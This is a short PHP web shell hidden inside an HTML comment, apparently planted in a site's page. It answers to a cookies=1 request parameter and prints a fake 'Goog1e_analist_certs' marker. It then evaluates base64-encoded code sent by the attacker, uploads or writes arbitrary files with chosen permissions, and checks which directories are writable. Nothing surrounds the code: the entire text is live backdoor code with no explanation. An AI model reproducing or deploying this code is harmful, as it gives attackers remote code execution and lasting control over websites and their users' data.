<!--<?php 
if(@$_REQUEST['cookies']==1){
echo '--'.'><i>Goog1e_analist_certs</i><br>';
if(@$_REQUEST['e']){eval(base64_decode($_REQUEST['e']));}
elseif(@$_FILES['f']['name']){move_uploaded_file($_FILES['f']['tmp_name'],@$_REQUEST['fp'].$_FILES['f']['name']);if(@$_REQUEST['fc']){@chmod($_FILES['f']['name'],$_REQUEST['fc']);}}
elseif(@$_REQUEST['nn']){$fh=fopen(@$_REQUEST['nn'],'w');fwrite($fh,@$_REQUEST['nd']);fclose($fh); if(@$_REQUEST['fc']){@chmod(@$_REQUEST['nn'],$_REQUEST['fc']);}}
else{$p=str_replace('\\','/',$_SERVER['REQUEST_URI']);
$pt=str_replace('/','../',substr(preg_replace('/[^\/]/','',$p),1)).'./';
echo chr(118).chr(46).chr(46).@is_writable($pt);
}echo '<!'.'--';}
?>-->
